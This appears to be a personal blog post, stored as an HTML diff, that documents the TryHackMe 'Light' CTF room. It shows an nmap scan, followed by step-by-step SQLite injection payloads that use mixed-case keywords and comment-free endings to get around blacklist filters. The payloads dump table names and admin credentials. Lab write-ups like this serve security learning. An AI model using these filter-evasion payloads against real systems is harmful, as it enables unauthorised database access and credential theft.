@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by yousinix
+  Free for personal and commercial use under the MIT license
+  https://github.com/yousinix/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Light">
+  <meta property="og:description" content="Tryhackme - Medium">
+  <meta property="og:image" content="/assets/img/profile.png">
+
+  <title>Light</title>
+  <meta name="description" content="Tryhackme - Medium">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto">
+<a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Light</b></h1>
+
+<p class="post-metadata text-muted">
+  18 September 2023 -  
+  <b>4 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#sqlinjection">
+      <span class="tag badge badge-pill text-primary border border-primary">sqlinjection</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#obfuscation">
+      <span class="tag badge badge-pill text-primary border border-primary">obfuscation</span>
+    </a>
+    </p>
+
+<h2 id="info">Info</h2>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1737140605838" alt="infocard"></p>
+
+<p>In this CTF challenge, I faced a SQLite-based application that seemed innocuous at first—until I discovered its strict input filters. The mission: bypass blacklists, exploit SQL injection, and uncover a hidden flag. Here’s how I navigated errors, obfuscation, and SQLite’s quirks to succeed.</p>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>The initial reconnaissance was performed using <strong>Nmap</strong>, revealing the following open services:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 15:22 CET                                                                                                          
+Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                                                                                                 
+Service scan Timing: About 50.00% done; ETC: 15:23 (0:00:49 remaining)                                                                                                      
+Nmap scan report for 10.10.106.14                                                                                                                                           
+Host is up (0.051s latency).                                                                                                                                                
+                                                                                                                                                                            
+PORT     STATE SERVICE VERSION                                                                                                                                              
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)                                                                                         
+| ssh-hostkey:                                                                                                                                                              
+|   3072 61:c5:06:f2:4a:20:5b:cd:09:4d:72:b0:a5:aa:ce:71 (RSA)                                                                                                              
+|   256 51:e0:5f:fa:81:64:d3:d9:26:24:16:ca:45:94:c2:00 (ECDSA)                                                                                                             
+|_  256 77:e1:36:3b:95:9d:e0:3e:0a:56:82:b2:9d:4c:fe:1a (ED25519)                                                                                                           
+1337/tcp open  waste?                                                                                                                                                       
+| fingerprint-strings:                                                                                                                                                      
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:                          
+|     Welcome to the Light database!                                                                                                                                        
+|     Please enter your username:                                                                                                                                           
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest:                                                                                            
+|     Welcome to the Light database!                                                                                                                                        
+|     Please enter your username: Username not found.
+|_    Please enter your username:
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service
+</code></pre></div></div>
+
+<h2 id="phase-1-the-initial-struggle"><strong>Phase 1: The Initial Struggle</strong></h2>
+
+<p>The challenge began with a network connection to the target:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nv">$ip</span> 1337  
+</code></pre></div></div>
+<p>The application greeted me with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the Light database!  
+Please enter your username:  
+</code></pre></div></div>
+
+<p>I entered given username <strong>smokey</strong> and it gives me password for User. (<code class="language-plaintext highlighter-rouge">smokey:vYQ5ngPpw8AdUmL</code>). This is database application so lets try SQL Injection Attack.</p>
+
+<p><strong>First Attempt</strong>:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION SELECT null, table_name, null FROM information_schema.tables --
+</span></code></pre></div></div>
+<p><strong>Response</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)  
+</code></pre></div></div>
+<p>The error revealed that <code class="language-plaintext highlighter-rouge">--</code>, <code class="language-plaintext highlighter-rouge">/*</code>, and vertical tabs (<code class="language-plaintext highlighter-rouge">%0b</code>) were blocked. Worse, <code class="language-plaintext highlighter-rouge">information_schema.tables</code> didn’t exist—this wasn’t MySQL!</p>
+
+<hr>
+
+<h2 id="phase-2-pivoting-to-sqlite"><strong>Phase 2: Pivoting to SQLite</strong></h2>
+
+<h3 id="obfuscation-trick-1-mixed-case-keywords"><strong>Obfuscation Trick #1: Mixed-Case Keywords</strong></h3>
+
+<p>I bypassed keyword blacklists (<code class="language-plaintext highlighter-rouge">UNION</code>, <code class="language-plaintext highlighter-rouge">SELECT</code>) using mixed-case:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UnIoN SeLeCt null, table_name, null FrOm information_schema.tables WhErE '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>  
+</code></pre></div></div>
+<p><strong>Result</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Error: no such table: information_schema.tables  
+</code></pre></div></div>
+<p>This confirmed SQLite. Time to use its metadata tables.</p>
+
+<hr>
+
+<h2 id="phase-3-bypassing-filters"><strong>Phase 3: Bypassing Filters</strong></h2>
+
+<h3 id="obfuscation-trick-2-tabs-instead-of-spaces"><strong>Obfuscation Trick #2: Tabs Instead of Spaces</strong></h3>
+<p>The app blocked spaces, so I replaced them with URL-encoded tabs (<code class="language-plaintext highlighter-rouge">%09</code>):</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UniOn%09SelEct%09null,name,null%09FrOm%09sqlite_master%09WhErE%09type='</span><span class="k">table</span><span class="s1">'  
+</span></code></pre></div></div>
+<p><strong>Result</strong>: Syntax errors due to <code class="language-plaintext highlighter-rouge">%</code> encoding issues.</p>
+
+<h3 id="obfuscation-trick-3-avoiding-comments"><strong>Obfuscation Trick #3: Avoiding Comments</strong></h3>
+<p>Since <code class="language-plaintext highlighter-rouge">--</code> was blocked, I terminated queries with <code class="language-plaintext highlighter-rouge">WHERE '1'='1</code>:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION SELECT file FROM PRAGMA_database_list WHERE '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>  
+</code></pre></div></div>
+<p><strong>Output</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password: /home/adrian/users.db  
+</code></pre></div></div>
+<p>Bingo! The database file was <code class="language-plaintext highlighter-rouge">users.db</code>.</p>
+
+<hr>
+
+<h2 id="phase-4-extracting-tables-and-columns"><strong>Phase 4: Extracting Tables and Columns</strong></h2>
+
+<h3 id="listing-tables"><strong>Listing Tables</strong></h3>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UnIoN SeLeCt name FROM sqlite_master WHERE type='</span><span class="k">table</span><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>  
+</code></pre></div></div>
+<p><strong>Result</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password: admintable  
+</code></pre></div></div>
+<p>Later, I discovered <code class="language-plaintext highlighter-rouge">usertable</code>.</p>
+
+<h3 id="extracting-columns"><strong>Extracting Columns</strong></h3>
+
+<p>For the <code class="language-plaintext highlighter-rouge">admintable</code>:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UnIoN SeLeCt group_concat(name) FROM PRAGMA_table_info('</span><span class="n">admintable</span><span class="s1">') WHERE '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>  
+</code></pre></div></div>
+<p><strong>Output</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password: id,username,password  
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="phase-5-dumping-credentials-and-the-flag"><strong>Phase 5: Dumping Credentials and the Flag</strong></h2>
+
+<h3 id="admintable-exploit"><strong>Admintable Exploit</strong></h3>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UnIoN SeLeCt username || '</span><span class="p">:</span><span class="s1">' || password FROM admintable WHERE '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>  
+</code></pre></div></div>
+<p><strong>Result</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password: TryHackMeAdmin:mamZtAuMlrsEy5bp6q17  
+</code></pre></div></div>
+<h3 id="the-final-payload"><strong>The Final Payload</strong></h3>
+
+<p>To concatenate all data:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UnIoN SeLeCt group_concat(username || '</span><span class="p">:</span><span class="s1">' || password) FROM admintable WHERE '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>  
+</code></pre></div></div>
+<p><strong>Flag Captured</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password: TryHackMeAdmin:mamZtAuMlrsEy5bp6q17,flag:THM{S********************O?}  
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="key-obfuscation-techniques"><strong>Key Obfuscation Techniques</strong></h2>
+
+<ol>
+  <li>
+<strong>Mixed-Case Keywords</strong>: <code class="language-plaintext highlighter-rouge">UnIoN</code>, <code class="language-plaintext highlighter-rouge">SeLeCt</code> evaded keyword filters.</li>
+  <li>
+<strong>Tab Encoding</strong>: Replaced spaces with <code class="language-plaintext highlighter-rouge">%09</code> to bypass space detection.</li>
+  <li>
+<strong>Avoiding Comments</strong>: Used <code class="language-plaintext highlighter-rouge">WHERE '1'='1</code> instead of <code class="language-plaintext highlighter-rouge">--</code> or <code class="language-plaintext highlighter-rouge">#</code>.</li>
+  <li>
+<strong>Metadata Adaptation</strong>: Leveraged <code class="language-plaintext highlighter-rouge">sqlite_master</code> and <code class="language-plaintext highlighter-rouge">PRAGMA</code> instead of <code class="language-plaintext highlighter-rouge">information_schema</code>.</li>
+</ol>
+
+<hr>
+
+<h2 id="why-this-worked"><strong>Why This Worked</strong></h2>
+
+<ul>
+  <li>
+<strong>SQLite’s Flexibility</strong>: Its <code class="language-plaintext highlighter-rouge">PRAGMA</code> functions and <code class="language-plaintext highlighter-rouge">sqlite_master</code> table provided metadata access.</li>
+  <li>
+<strong>Persistence</strong>: Iterative testing and adjusting payloads based on errors.</li>
+  <li>
+<strong>Filter Evasion</strong>: Simple obfuscation defeated naive blacklists.</li>
+</ul>
+
+<hr>
+
+<h2 id="conclusion"><strong>Conclusion</strong></h2>
+
+<ol>
+  <li>
+<strong>Adapt to the Database</strong>: SQLite requires different syntax than MySQL/PostgreSQL.</li>
+  <li>
+<strong>Errors Are Clues</strong>: Each failure refined my payload.</li>
+  <li>
+<strong>Obfuscation is Key</strong>: Small tweaks can bypass restrictive filters.</li>
+</ol>
+
+<hr>
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>Akshay Chavan</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center">
+<a class="social mx-1" href="mailto:akschavan100@gmail.com" style="color: #6c757d" onmouseover="this.style.color='#db4437'" onmouseout="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1" href="https://www.github.com/akshaychavan10" style="color: #6c757d" onmouseover="this.style.color='#333333'" onmouseout="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1" href="https://www.linkedin.com/in/akshaychavan07" style="color: #6c757d" onmouseover="this.style.color='#007bb5'" onmouseout="this.style.color='#6c757d'">
+      <i class="fab fa-linkedin-in fa-1x"></i>
+    </a>
+
+</div>
+<small id="attribution">
+    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
+  </small>
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
